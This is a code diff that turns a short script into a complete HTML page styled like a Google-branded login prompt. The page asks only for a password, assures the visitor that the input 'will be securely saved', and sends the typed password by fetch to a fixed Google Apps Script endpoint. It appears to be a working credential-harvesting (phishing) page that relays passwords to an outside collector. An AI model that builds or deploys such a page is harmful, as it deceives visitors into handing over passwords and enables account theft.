@@ -1,28 +1,123 @@
-<script>
-  function sendData() {
-    const userInput = document.getElementById('userInput').value;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Style Input</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(145deg, #1a73e8, #4285f4);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+    }
 
-    // Remplacez l'URL suivante par votre Web App URL
-    const endpoint = 'https://script.google.com/macros/s/AKfycby0W6WYiO697tRCpDzT6C0O0dcJNviu56Sa6amMwGuaTyGNEY-1TV8c6AWNpJVEGPct/exec';
+    .container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      width: 400px;
+    }
 
-    fetch(endpoint, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ input: userInput }),
-    })
-      .then(response => response.json())
-      .then(data => {
-        if (data.status === 'success') {
-          alert('Data sent successfully!');
-        } else {
-          alert('Failed to send data.');
-        }
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 80px;
+      height: 80px;
+    }
+
+    .password-input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid rgba(255, 255, 255, 0.5);
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+      font-size: 1rem;
+      margin-bottom: 20px;
+      outline: none;
+      transition: border 0.3s ease;
+    }
+
+    .password-input:focus {
+      border: 1px solid #fff;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background: #4285f4;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background: #2a6ed4;
+    }
+
+    .info-text {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <!-- Logo resembling a user icon -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/99/Sample_User_Icon.png" alt="User Icon">
+    </div>
+    <input 
+      type="password" 
+      class="password-input" 
+      placeholder="Enter your password" 
+      id="userInput"
+    />
+    <button class="submit-btn" onclick="sendData()">Submit</button>
+    <p class="info-text">Your input will be securely saved.</p>
+  </div>
+
+  <script>
+    function sendData() {
+      const userInput = document.getElementById('userInput').value;
+
+      // Remplacez cette URL par l'URL de votre Google Apps Script
+      const endpoint = 'https://script.google.com/macros/s/AKfycby0W6WYiO697tRCpDzT6C0O0dcJNviu56Sa6amMwGuaTyGNEY-1TV8c6AWNpJVEGPct/exec';
+
+      fetch(endpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ input: userInput }),
       })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('An error occurred.');
-      });
-  }
-</script>
+        .then(response => response.json())
+        .then(data => {
+          if (data.status === 'success') {
+            alert('Data sent successfully!');
+          } else {
+            alert('Failed to send data.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred.');
+        });
+    }
+  </script>
+</body>
+</html>
